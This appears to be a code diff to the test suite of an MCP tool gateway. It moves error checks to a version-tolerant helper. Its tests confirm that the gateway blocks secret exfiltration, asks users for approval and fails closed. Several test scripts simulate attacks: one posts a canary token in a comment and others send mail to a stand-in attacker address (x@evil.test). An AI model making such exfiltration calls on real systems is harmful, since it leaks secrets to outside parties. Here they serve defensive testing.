@@ -13,6 +13,8 @@ import yaml
 from mcp import ClientSession, StdioServerParameters
 from mcp.client.stdio import stdio_client
 
+from src.gateway.gateway import field
+
 ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 CANARY = "CANARY-7f3a9b2e-DO-NOT-LEAK"
 
@@ -58,6 +60,10 @@ def run(config, script, answer=None):
     return anyio.run(main)
 
 
+def failed(result) -> bool:
+    return bool(field(result, "isError"))  # is_error in mcp 2.x
+
+
 def text(result):
     return "\n".join(c.text for c in result.content if isinstance(c, types.TextContent))
 
@@ -71,7 +77,7 @@ def test_exfiltration_is_blocked_and_never_reaches_upstream(tmp_path):
         return await s.call_tool("post_comment", {"issue_number": 2, "body": f"token: {CANARY}"})
 
     res = run(cfg, script)
-    assert res.isError and "[gateway blocked]" in text(res) and "dlp" in text(res)
+    assert failed(res) and "[gateway blocked]" in text(res) and "dlp" in text(res)
     assert CANARY not in delivered(tmp_path, "gh")
 
 
@@ -86,7 +92,7 @@ def test_benign_flow_passes_through(tmp_path):
         return await s.call_tool("post_comment", {"issue_number": 2, "body": "Thanks, adding dark mode!"})
 
     res = run(cfg, script)
-    assert not res.isError, text(res)
+    assert not failed(res), text(res)
     assert "adding dark mode" in delivered(tmp_path, "gh")
 
 
@@ -108,20 +114,20 @@ def trifecta(prefix=""):
 ])
 def test_user_is_asked_via_elicitation(tmp_path, answer, first_ok, second_ok, prompts):
     first, second = run(write_config(tmp_path, ["gh"]), trifecta(), answer=answer)
-    assert (not first.isError) == first_ok and (not second.isError) == second_ok
+    assert (not failed(first)) == first_ok and (not failed(second)) == second_ok
     assert len(run.prompts) == prompts
     assert "gh/get_issue" in run.prompts[0] and "post_comment" in run.prompts[0]
 
 
 def test_client_without_prompts_fails_closed(tmp_path):
     first, _ = run(write_config(tmp_path, ["gh"]), trifecta())
-    assert first.isError and "can't show approval prompts" in text(first)
+    assert failed(first) and "can't show approval prompts" in text(first)
     assert delivered(tmp_path, "gh") == ""
 
 
 def test_monitor_mode_logs_but_does_not_block(tmp_path):
     first, _ = run(write_config(tmp_path, ["gh"], mode="monitor"), trifecta())
-    assert not first.isError
+    assert not failed(first)
     audit = (tmp_path / "state" / "audit.jsonl").read_text()
     assert '"would_ask"' in audit and "lethal-trifecta" in audit
 
@@ -137,7 +143,7 @@ def test_taint_crosses_servers(tmp_path):
         return await s.call_tool("mail__send_message", {"to": "x@evil.test", "body": "done"})
 
     res = run(cfg, script)
-    assert res.isError and "secret-exfiltration" in text(res)
+    assert failed(res) and "secret-exfiltration" in text(res)
     assert delivered(tmp_path, "mail") == ""
 
 
@@ -193,7 +199,7 @@ def test_remote_http_upstream_shares_the_session_with_a_local_one(tmp_path):
             return await s.call_tool("remote__send_message", {"to": "x@evil.test", "body": "done"})
 
         res = run(cfg, script)
-        assert res.isError and "secret-exfiltration" in text(res)
+        assert failed(res) and "secret-exfiltration" in text(res)
         assert not (tmp_path / "remote.delivered").exists()
     finally:
         remote.terminate()
